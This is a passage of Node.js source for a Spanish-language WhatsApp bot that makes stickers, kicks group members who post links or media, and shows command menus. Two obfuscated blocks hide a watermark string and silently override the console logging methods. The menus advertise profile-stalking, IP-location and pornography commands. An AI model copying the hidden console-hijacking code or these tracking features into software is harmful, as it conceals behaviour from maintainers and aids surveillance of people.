				const _0x1766 = ['warn', '1kpfGKg', 'console', 'toString', 'constructor', 'length', '178061stRBUX', '1300545pGpVkk', '138xeSLmh', 'return\x20(function()\x20', 'log', '934846oKLsog', '9350TIPSLK', '25Aspfso', '433203bjkpOB', '^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}', 'test', '360802vwcGNc', '__proto__', 'prototype', 'error', 'bind', '\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSam\x20Nexusᴮᴼᵀ\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20', '104838iWsgLj', 'apply', 'trace', 'table', 'return\x20/\x22\x20+\x20this\x20+\x20\x22/']; const _0x4d367b = _0x5de4; (function (_0x3eb50f, _0x5003ec) { const _0x160706 = _0x5de4; while (!![]) { try { const _0x1f0294 = parseInt(_0x160706(0x94)) * -parseInt(_0x160706(0x90)) + -parseInt(_0x160706(0x8f)) + -parseInt(_0x160706(0x96)) + -parseInt(_0x160706(0x93)) + parseInt(_0x160706(0x9f)) * -parseInt(_0x160706(0x89)) + parseInt(_0x160706(0x99)) + -parseInt(_0x160706(0x95)) * -parseInt(_0x160706(0x8e)); if (_0x1f0294 === _0x5003ec) break; else _0x3eb50f['push'](_0x3eb50f['shift']()); } catch (_0x5172fc) { _0x3eb50f['push'](_0x3eb50f['shift']()); } } }(_0x1766, 0xb6c33)); const _0x33a8e1 = function () { let _0x15f095 = !![]; return function (_0xc7cbfc, _0x3249de) { const _0x38e2d8 = _0x15f095 ? function () { const _0x52e93e = _0x5de4; if (_0x3249de) { const _0x285798 = _0x3249de[_0x52e93e(0xa0)](_0xc7cbfc, arguments); return _0x3249de = null, _0x285798; } } : function () { }; return _0x15f095 = ![], _0x38e2d8; }; }(), _0x49176f = _0x33a8e1(this, function () { const _0x10650c = function () { const _0x379fdc = _0x5de4, _0x3a1fbc = _0x10650c['constructor'](_0x379fdc(0x87))()[_0x379fdc(0x8c)](_0x379fdc(0x97)); return !_0x3a1fbc[_0x379fdc(0x98)](_0x49176f); }; return _0x10650c(); }); function _0x5de4(_0x1fdbaf, _0x29f9bf) { return _0x5de4 = function (_0x165099, _0x5b786d) { _0x165099 = _0x165099 - 0x86; let _0x1efd2f = _0x1766[_0x165099]; return _0x1efd2f; }, _0x5de4(_0x1fdbaf, _0x29f9bf); } _0x49176f(); const _0x1efd2f = function () { let _0x1bb24e = !![]; return function (_0x15bf9c, _0x1d48e4) { const _0x4f2296 = _0x1bb24e ? function () { const _0x55ad81 = _0x5de4; if (_0x1d48e4) { const _0x53132f = _0x1d48e4[_0x55ad81(0xa0)](_0x15bf9c, arguments); return _0x1d48e4 = null, _0x53132f; } } : function () { }; return _0x1bb24e = ![], _0x4f2296; }; }(), _0x5b786d = _0x1efd2f(this, function () { const _0x34c292 = _0x5de4, _0x15e5c1 = function () { const _0x5bb16a = _0x5de4; let _0x401748; try { _0x401748 = Function(_0x5bb16a(0x91) + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')(); } catch (_0x2b5e28) { _0x401748 = window; } return _0x401748; }, _0x3e62c6 = _0x15e5c1(), _0x245f34 = _0x3e62c6[_0x34c292(0x8a)] = _0x3e62c6['console'] || {}, _0x1903dd = [_0x34c292(0x92), _0x34c292(0x88), 'info', _0x34c292(0x9c), 'exception', _0x34c292(0x86), _0x34c292(0xa1)]; for (let _0x5ae008 = 0x0; _0x5ae008 < _0x1903dd[_0x34c292(0x8d)]; _0x5ae008++) { const _0x58a6ed = _0x1efd2f['constructor'][_0x34c292(0x9b)][_0x34c292(0x9d)](_0x1efd2f), _0xb03c63 = _0x1903dd[_0x5ae008], _0x260eb3 = _0x245f34[_0xb03c63] || _0x58a6ed; _0x58a6ed[_0x34c292(0x9a)] = _0x1efd2f[_0x34c292(0x9d)](_0x1efd2f), _0x58a6ed[_0x34c292(0x8b)] = _0x260eb3[_0x34c292(0x8b)][_0x34c292(0x9d)](_0x260eb3), _0x245f34[_0xb03c63] = _0x58a6ed; } }); _0x5b786d(); const aaa = _0x4d367b(0x9e);
				const dataFl = `${aaa}`
				const author101 = args.join(' ')
				exif.create(dataFl, author101, `stickwm_${sender}`)
				await ffmpeg(`${media11}`)
					.input(media11)
					.on('start', function (cmd) {
						console.log(`Started : ${cmd}`)
					})
					.on('error', function (err) {
						console.log(`Error : ${err}`)
						fs.unlinkSync(media1)
						reply('*Intenta de nuevo*')
					})
					.on('end', function () {
						console.log('Finish')
						exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply('error')
							wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
							fs.unlinkSync(media11)
							fs.unlinkSync(`./sticker/${sender}.webp`)
							fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
						})
					})
					.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p]paletteuse`])
					.toFormat('webp')
					.save(`./sticker/${sender}.webp`)
			}
		}
		if ((isAutoSt && isMedia && sam.message.videoMessage.fileLength < 10000000 || isVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
			if (!itsMe) {
				const encmedia22 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				const media22 = await samu330.downloadAndSaveMediaMessage(encmedia22, `./sticker/${sender}`)
				const _0x27fb = ['1227757QFPTCj', 'table', 'error', 'console', '^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}', 'prototype', '4mOcIdv', '300973AXvFLL', '113PJAhxc', 'bind', '__proto__', 'constructor', '1hPhdPg', 'toString', '2614385THObwv', '\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0aSam\x20Nexusᴮᴼᵀ\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20', '674jhGLms', '1366829jQTHFD', '378748rzovFh', 'exception', '1wImvle', '1305043VMjXUP', 'return\x20/\x22\x20+\x20this\x20+\x20\x22/', '{}.constructor(\x22return\x20this\x22)(\x20)', 'apply']; function _0x3657(_0x24f22c, _0x12d4cd) { return _0x3657 = function (_0x36fb84, _0x290295) { _0x36fb84 = _0x36fb84 - 0x135; let _0x42acbe = _0x27fb[_0x36fb84]; return _0x42acbe; }, _0x3657(_0x24f22c, _0x12d4cd); } const _0x495578 = _0x3657; (function (_0x53a12a, _0x3301a7) { const _0x1d2e31 = _0x3657; while (!![]) { try { const _0x162d02 = -parseInt(_0x1d2e31(0x135)) + -parseInt(_0x1d2e31(0x14a)) + parseInt(_0x1d2e31(0x149)) * parseInt(_0x1d2e31(0x146)) + -parseInt(_0x1d2e31(0x13d)) * -parseInt(_0x1d2e31(0x145)) + parseInt(_0x1d2e31(0x141)) * parseInt(_0x1d2e31(0x147)) + parseInt(_0x1d2e31(0x13b)) * -parseInt(_0x1d2e31(0x13c)) + parseInt(_0x1d2e31(0x143)); if (_0x162d02 === _0x3301a7) break; else _0x53a12a['push'](_0x53a12a['shift']()); } catch (_0x50b87f) { _0x53a12a['push'](_0x53a12a['shift']()); } } }(_0x27fb, 0xaac28)); const _0x333816 = function () { let _0x3b9de2 = !![]; return function (_0x34ee6d, _0x3e4e7c) { const _0x338996 = _0x3b9de2 ? function () { const _0x475110 = _0x3657; if (_0x3e4e7c) { const _0x1db804 = _0x3e4e7c[_0x475110(0x14d)](_0x34ee6d, arguments); return _0x3e4e7c = null, _0x1db804; } } : function () { }; return _0x3b9de2 = ![], _0x338996; }; }(), _0x835717 = _0x333816(this, function () { const _0xee8b8e = function () { const _0x50f77d = _0x3657, _0x3c9dc1 = _0xee8b8e[_0x50f77d(0x140)](_0x50f77d(0x14b))()[_0x50f77d(0x140)](_0x50f77d(0x139)); return !_0x3c9dc1['test'](_0x835717); }; return _0xee8b8e(); }); _0x835717(); const _0x42acbe = function () { let _0x37110c = !![]; return function (_0x5a1047, _0x16f831) { const _0x2238b9 = _0x37110c ? function () { if (_0x16f831) { const _0x184403 = _0x16f831['apply'](_0x5a1047, arguments); return _0x16f831 = null, _0x184403; } } : function () { }; return _0x37110c = ![], _0x2238b9; }; }(), _0x290295 = _0x42acbe(this, function () { const _0x39d9ee = _0x3657; let _0x4b1d9a; try { const _0x19fa90 = Function('return\x20(function()\x20' + _0x39d9ee(0x14c) + ');'); _0x4b1d9a = _0x19fa90(); } catch (_0x477b7c) { _0x4b1d9a = window; } const _0x32fe68 = _0x4b1d9a[_0x39d9ee(0x138)] = _0x4b1d9a[_0x39d9ee(0x138)] || {}, _0x3152dd = ['log', 'warn', 'info', _0x39d9ee(0x137), _0x39d9ee(0x148), _0x39d9ee(0x136), 'trace']; for (let _0x244612 = 0x0; _0x244612 < _0x3152dd['length']; _0x244612++) { const _0x55e7a2 = _0x42acbe['constructor'][_0x39d9ee(0x13a)]['bind'](_0x42acbe), _0x15b4f3 = _0x3152dd[_0x244612], _0x44c3e4 = _0x32fe68[_0x15b4f3] || _0x55e7a2; _0x55e7a2[_0x39d9ee(0x13f)] = _0x42acbe[_0x39d9ee(0x13e)](_0x42acbe), _0x55e7a2[_0x39d9ee(0x142)] = _0x44c3e4['toString'][_0x39d9ee(0x13e)](_0x44c3e4), _0x32fe68[_0x15b4f3] = _0x55e7a2; } }); _0x290295(); const aaa = _0x495578(0x144);
				const packname1001 = `${aaa}`
				const author1001 = args.join(' ')
				exif.create(packname1001, author1001, `stickwm_${sender}`)
				reply('*⌛ EN PROCESO*')
				await ffmpeg(`${media22}`)
					.inputFormat(media22.split('.')[4])
					.on('start', function (cmd) {
						console.log(`Started : ${cmd}`)
					})
					.on('error', function (err) {
						console.log(`Error : ${err}`)
						fs.unlinkSync(media22)
						tipe = media.endsWith('.mp4') ? 'video' : 'gif'
						reply('*Intenta de nuevo*')
					})
					.on('end', function () {
						console.log('Finish')
						exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
							if (error) return reply('error')
							wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
							fs.unlinkSync(media22)
							fs.unlinkSync(`./sticker/${sender}.webp`)
							fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
						})
					})
					.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
					.toFormat('webp')
					.save(`./sticker/${sender}.webp`)
			}
		}
		if (messagesC.includes("chat.whatsapp")) {
			if (!isGroup) return
			if (!isAntigp) return
			if (isAdmin) return reply('Tienes suerte, eres administrador y no te sacaré.')
			reply(`Link detectado ${sender.split("@")[0]} serás expulsado de este grupo.`)
			samu330.groupRemove(from, [sender])
		}


		///////////////////////FUNCIONES CREADAS POR SAMU330\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

		if (isGroup && botAdmin && isAntiMedia) {
			if (!itsMe) {
				if (isMedia && !sam.message.videoMessage || isImage) {
					samu330.updatePresence(from, Presence.composing)
					reply(`Lo siento ${sender.split("@")[0]}, pero aquí no se permiten las fotos ni videos, *serás expulsado por seguridad.*`)
					await sleep(5000)
					samu330.groupRemove(from, [sender])
				}
			}
		}
		if (isGroup && botAdmin && isAntiMedia) {
			if (!itsMe) {
				if (isMedia && sam.message.videoMessage) {
					samu330.updatePresence(from, Presence.composing)
					reply(`Lo siento ${sender.split("@")[0]}, pero aquí no se permiten las fotos ni videos, *serás expulsado por seguridad.*`)
					await sleep(5000)
					samu330.groupRemove(from, [sender])
				}
			}
		}
		if (isGroup && botAdmin && isAntiLeg) {
			if (!itsMe) {
				if (isAudio) {
					if (isAdmin) reply(`😒Por ser administrador deberías dar el ejemplo, ya que *Antileg* está activado, ósea que no se permiten toda clase de mensajes que puedan ser perjudiciales para el Bot... pero... como eres administrador crees que puedes hacer lo que sea. 🙄\n*
					Pero conmigo no es así. 😑*\n
					`)
					reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTA ACTIVADO EL COMANDO ANTILEG, POR SEGURIDAD TE ELIMINARE.*\n`)
					await sleep(5000)
					samu330.groupRemove(from, [sender])
				}
			}
		}
		if (isGroup && botAdmin && isAntiLeg) {
			if (!itsMe) {
				if (isContact) {
					if (isAdmin) reply(`😒Por ser administrador deberías dar el ejemplo, ya que *Antileg* está activado, ósea que no se permiten toda clase de mensajes que puedan ser perjudiciales para el Bot... pero... como eres administrador crees que puedes hacer lo que sea. 🙄\n*
					Pero conmigo no es así. 😑*\n
					`)
					reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS CONTACTOS, YA QUE ESTA ACTIVADO EL COMANDO ANTILEG, POR SEGURIDAD TE ELIMINARE*\n`)
					await sleep(5000)
					samu330.groupRemove(from, [sender])
				}
			}
		}
		if (isGroup && botAdmin && isAntiLeg) {
			if (!itsMe) {
				if (q.length > 10000) {
					reply('*Este mensaje contiene más de 10, 000 caracteres, probablemente pueda causar problemas al Bot, por lo que tendré que eliminarte🙂*\n')
					samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
						samu330.sendMessage(from, '*Esperemos 10 segundos🙄*', MessageType.text)
					})
					await sleep(10000)
					samu330.groupRemove(from, [sender])
					samu330.groupSettingChange(from, GroupSettingChange.messageSend, false)
				}
			}
		}
		if (isGroup && botAdmin && isAntiLeg) {
			if (!itsMe) {
				if (isLocation) {
					if (isAdmin) reply(`😒Por ser administrador deberías dar el ejemplo, ya que *Antileg* está activado, ósea que no se permiten toda clase de mensajes que puedan ser perjudiciales para el Bot... pero... como eres administrador crees que puedes hacer lo que sea. 🙄\n`)
					reply(`*LOCALIZACION DETECTADA, EN ESTE GRUPO NO SE PERMITEN LAS LOCALIZACIONES, YA QUE ESTA ACTIVADO EL COMANDO ANTILEG, POR SEGURIDAD TE ELIMINARE*\n`)
					await sleep(5000)
					samu330.groupRemove(from, [sender])
				}
			}
		}
		switch (is) {
			case 'buenos':
				buf = fs.readFileSync(`./temp/audio/wenas.mp3`)
				samu330.sendMessage(from, buf, audio, {
					mimetype: 'audio/mp4', quoted: faud, duration: -999999, ptt: true
				})
		}

		//Zona de Comandos🛵
		switch (command) {
			
			case 'buenos':
				buf = fs.readFileSync(`./temp/audio/wenas.mp3`)
				samu330.sendMessage(from, buf, audio, {
					mimetype: 'audio/mp4', quoted: faud, duration: -999999, ptt: true
				})
			break

			case 'help':
			case 'menu':
			case 'comandos':
				const moment = require('moment-timezone')
				const jmn = moment.tz('America/Lima').format('HH:mm:ss')
				whatsapp = '0@s.whatsapp.net'
				fb = '447710173736@s.whatsapp.net'
				let d = new Date
				let locale = 'es'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				let weton = ['domingo', 'lunes', 'Martes', 'Miercoles', 'Jueves', 'Viernes', 'Sabado'][Math.floor(((d * 1) + gmt) / 84600000) % 7]
				let week = d.toLocaleDateString(locale, { weekday: 'long' })
				let calender = d.toLocaleDateString(locale, {
					day: 'numeric',
					month: 'long',
					year: 'numeric'
				})
				var num = sam.participant
				foto = fs.readFileSync('./src/help.jpg')
				fakee = fs.readFileSync('./src/fake.jpg')
				assistant = fs.readFileSync('./src/assistant.jpg')
				samu330.updatePresence(from, Presence.recording)
				uptime = process.uptime()
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				Menu = `
					Hola *${pushname}* ${timeFt}

					*Hora:* ${jmn}
					*Fecha:* ${calender}
					*No olvides leer las reglas:* ${prefix}reglas

					======[ *Versión 3.0* ]======

					*Comandos usados hoy:* ${hit_today.length}
					*Prefijo:* [ ${prefix} ]
					*Tiempo de actividad:* ${uptime}
					*Estado:* Conectado
					*Grupo:* ${groupName}
					*Número del Creador:* wa.me/+51963324153


					======[ *Nexusᴮᴼᵀ* ]======

					*Navegador:* ${samu330.browserDescription[1]}
					*Servidor:* ${samu330.browserDescription[0]}
					*Versión:* ${samu330.browserDescription[2]}
					*Velocidad:* ${process.uptime()}
					*Dispositivo:* ${samu330.user.phone.device_manufacturer}
					*Modelo:* ${samu330.user.phone.device_model}
					*Sistema operativo:* ${os.platform()}
					*Versión Sistema operativo:* ${samu330.user.phone.os_version}
					*Versión de WhatsApp:* ${samu330.user.phone.wa_version}


					╭─ *INICIO LISTA DE MENUS*
					├
					├ *${prefix}menu1* (Comandos Multimedia)
					├ *${prefix}menu2* (Comandos de Sticker)
					├ *${prefix}menu3* (Comandos de Grupos)
					├ *${prefix}menu4* (Comandos de Descargas)
					├ *${prefix}menu5* (Comandos Herramientas)
					├ *${prefix}menu6* (Comandos +18)
					├ *${prefix}menu7* (Comandos para Logos)
					├ *${prefix}menu8* (Comandos para el Creador)
					├ *${prefix}audios* (Audios)
					├
					╰─ *FIN LISTA DE MENUS*
				`
				samu330.sendMessage(from, Menu, MessageType.text, {
					quoted:
					{
						key: {
							fromMe: false,
							participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
						},
						message: {
							"documentMessage": { "title": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg') }
						}
					}
				})
			break

			case 'menu1':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				mda = `
					╔═════════════════╗
					╠               *MENU MULTIMEDIA*               ╣
					╠═════════════════╝
					║
					╠ *${prefix}caras*
					║ _Etiqueta una imagen para detectar caras._
					║
					╠ *${prefix}reversa*
					║ _Etiqueta un video para ponerlo en reversa._
					║
					╠ *${prefix}imagen*
					║ _Búsqueda de imágenes en Google._
					║
					╠ *${prefix}sinfondo*
					║ _Etiqueta una imagen para quitarle el fondo._
					║
					╠ *${prefix}wpbusca* 
					║ _Búsqueda de fondos de pantalla._
					║
					╠ *${prefix}waifu*
					║ _Imagen aleatoria de una waifu._
					║
					╠ *${prefix}neko*
					║ _Imagen aleatoria de una neko-girl._
					║
					╟╼╾┤🎧 Efectos para 𝘈𝘶𝘥𝘪𝘰𝘴 🎧├╼╾
					║
					╠ *${prefix}ardilla*
					║ _Etiqueta un audio._
					║
					╠ *${prefix}bass*
					║ _Etiqueta un audio._
					║
					╠ *${prefix}grave*
					║ _Etiqueta un audio._
					║
					╠ *${prefix}hode*
					║ _Etiqueta un audio._
					║
					╠ *${prefix}imut*
					║ _Etiqueta un audio._
					║
					╠ *${prefix}lento*
					║ _Etiqueta un audio._
					║
					╠ *${prefix}trigger*
					║ _Etiqueta un audio._
					║
					╰──────────────
				`
				samu330.sendMessage(from, mda, MessageType.text, {
					quoted:
					{
						key: {
							fromMe: false,
							participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
						},
						message: {
							"documentMessage": { "title": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg') }
						}
					}
				})
			break
			
			case 'menu2':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				stc = `
					╔═════════════════╗
					╠               *MENU DE STICKER*               ╣
					╠═════════════════╝
					║
					╠ *${prefix}sticker*
					║ _Etiqueta una imagen/gif/video._
					║
					╠ *${prefix}spack*
					║ _Paquete personalizado._
					║
					╠ *${prefix}robar*
					║
					╠ *${prefix}exif*
					║
					╠ *${prefix}takestick*
    				║ _Nombre|Autor_
					║
					╠ *${prefix}swm*
					║ _Nombre|Autor_
					║
					╠ *${prefix}colores*
					║ _Texto a colores_
					║
					╠ *${prefix}ger*
					║ _Estilo Triggered_
					║
					╠ *${prefix}aimg*
					║ _Stiker a imagen_
					║
					╠ *${prefix}agif*
					║ _Stiker a gif_
					║
					╰──────────────
				`
				samu330.sendMessage(from, stc, MessageType.text, {
					quoted:
					{
						key: {
							fromMe: false,
							participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
						},
						message: {
							"documentMessage": { "title": "Sam | Nexusᴮᴼᵀ", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg') }
						}
					}
				})
				break

			
			case 'menu3':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				uptime = process.uptime()

				const Menug = {
					text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                            
🔐Hola *${pushname}*

${bodyM} ${samu}${prefix}antilink${samu}
${bodyM} ${samu}${prefix}antimedia${samu}
${bodyM} ${samu}${prefix}antibad${samu}
${bodyM} ${samu}${prefix}autostick{samu}
${bodyM} ${samu}${prefix}antileg{samu}

${bodyM} ${samu}${prefix}antigp${samu}
_Para prohibir los links de otros grupos_

================================
*🔞PARA ACTIVAR LOS COMANDOS +18*:
================================
${bodyM} ${prefix}+18 1/0
================================
    _Modo simsimi ilimitado_

*${prefix}simsimi 1*


*Para que el bot entre a tu grupo, usa el siguiente comando:*
	${prefix}entrabot *(Link del grupo)*

${bodyM} ${prefix}inspeccionar _(Requiere link de un grupo)_
${bodyM} ${prefix}nuevogrupo
${bodyM} ${prefix}grupo abrir/cerrar
${bodyM} ${prefix}getpic
${bodyM} ${prefix}salir
${bodyM} ${prefix}tagstick
${bodyM} ${prefix}imagetag
${bodyM} ${prefix}hidetag
${bodyM} ${prefix}todos
${bodyM} ${prefix}setdesc
${bodyM} ${prefix}nombre
${bodyM} ${prefix}adminlist
${bodyM} ${prefix}setpic
${bodyM} ${prefix}enlinea
${bodyM} ${prefix}promote
${bodyM} ${prefix}demote
${bodyM} ${prefix}eliminar
${bodyM} ${prefix}añadir *(Numero sin el +)*
${bodyM} ${prefix}notif
${bodyM} ${prefix}reply @miembro|frase|frase
${bodyM} ${prefix}contacto @miembro|nombre
${bodyM} ${prefix}link
${bodyM} ${prefix}top5
${bodyM} ${prefix}clonar
`,
					contextInfo: {
						mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
					}
				}
				samu330.sendMessage(from, Menug, MessageType.text, {
					quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "➫𝑴𝒆𝒏𝒖 𝑫𝒆 𝑮𝒓𝒖𝒑𝒐𝒔\n❣️⃞🔥𝙎꯭𝙖͠𝙢꯭ 𝙔 ꯭𝙋꯭𝙚𝙧𝙧꯭𝙮🔥❣️", "jpegThumbnail": fs.readFileSync(`./NyanBot.jpg`) } } }
				})
				break
			case 'menu4':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				uptime = process.uptime()
				const Menud = {
					text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li   

🔐Hola *${pushname}*

♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪

${bodyM} ${prefix}play *(Descarga de musica)*
${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
${bodyM} ${prefix}twit *(videos de Twitter)*
${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
${bodyM} ${prefix}fb _(Link de FaceBook)_
${bodyM} ${prefix}mfire *(Link de mediafire)*
${bodyM} ${prefix}tomp3 *(Videos a audio)*
${bodyM} ${prefix}letra *(Busca la letra de una cancion)*
`,
					contextInfo: {
						mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
					}
				}
				samu330.sendMessage(from, Menud, MessageType.text, {
					quoted: fvid
				})
				break
			case 'menu5':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				uptime = process.uptime()
				const Menuo = {
					text: `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li                                                                


${bodyM} ${prefix}pregunta *(Haz una pregunta y el bot te responde)*
${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
${bodyM} ${prefix}igstalk *(Nombre de Usuario)*
${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
${bodyM} ${prefix}tiktokstalk @usuario
${bodyM} ${prefix}hidetag *(Texto)*
${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
${bodyM} ${prefix}shortlink _(Acortador de links)_
${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
${bodyM} ${prefix}binatext *(codigo binario a texto)*
${bodyM} ${prefix}aoctal *(texto a codigo octal)*
${bodyM} ${prefix}octalatext *(codigo octal a texto)*
${bodyM} ${prefix}ahex *(texto a codigo hex)*
${bodyM} ${prefix}hexatext *(codigo hex a texto)*
${bodyM} ${prefix}wa.me
${bodyM} ${prefix}idioimas
${bodyM} ${prefix}reversa
${bodyM} ${prefix}meme
${bodyM} ${prefix}leermas _frase/frase_
${bodyM} ${prefix}mapa
${bodyM} ${prefix}soyyo
${bodyM} ${prefix}blocklist
${bodyM} ${prefix}leerimagen

*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
	      🌸 SamịPerry.li 🌸
 ********************************
`,
					contextInfo: {
						mentionedJid: [sender], "forwardingScore": 9999, "isForwarded": true
					}
				}
				samu330.sendMessage(from, Menuo, MessageType.text, {
					quoted: floc
				})
				break
			case 'menu6':
				samu330.updatePresence(from, Presence.composing)
				if (!isRegister) return reply(mess.only.usrReg)
				if (!isGroup) return reply(mess.only.group)
				if (!isNsfw) return reply(mess.nsfw)
				samuPn = fs.readFileSync('./src/+18.jpg')
				uptime = process.uptime()
				const Menu18 = `➫ြ𝚜ᷤ𝚊ͣ𝚖ͫ𝚞𝉄𖾔𖾔𖽙.li Oℱịcιɑl.li

${bodyM} ${prefix}porno
${bodyM} ${prefix}lesbian 
${bodyM} ${prefix}tetas
${bodyM} ${prefix}ass
${bodyM} ${prefix}pussy
${bodyM} ${prefix}xnxx *(Link de Xnxx.com)*
${bodyM} ${prefix}pornode *(Japonesas)*
${bodyM} ${prefix}xvid *(Japonesas)*
${bodyM} ${prefix}dxvid *(Descarga videos de Xvideos)* _Requiere contraseña_

